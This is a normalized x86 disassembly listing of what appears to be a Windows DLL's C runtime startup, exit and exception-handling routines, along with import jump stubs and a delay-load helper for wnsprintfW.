retn 0x4
sub_30005b5e
push [ esp + 0x4 ]
call sub_300059b6
pop ecx
retn 0x4
sub_30005f43
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x30 ]
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call [ _c_exit@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
call sub_30006185
retn
push esi
call [ _exit@IAT ]
sub_3000608a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
jmp [ _onexit@IAT ]
sub_300060b0
push [ esp + 0x4 ]
call sub_3000608a
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_300060ef
xor eax eax
inc eax
retn
sub_30006133
xor eax eax
inc eax
retn
sub_30006185
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
_wtol
jmp [ _wtol@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
memmove
jmp [ memmove@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_300061ba
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_300061cc
xor eax eax
retn
sub_300061cf
retn
__dllonexit
jmp [ __dllonexit@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_300061dc
mov eax wnsprintfW@IAT
jmp sub_300061e3
sub_300061e3
push ecx
push edx
push eax
push __delay_import_directory_entries
call sub_300061fb
pop edx
pop ecx
jmp eax
sub_30006fe0
push cs
or [ eax + 0x445352bb ] eax
push ebx
cld
retn
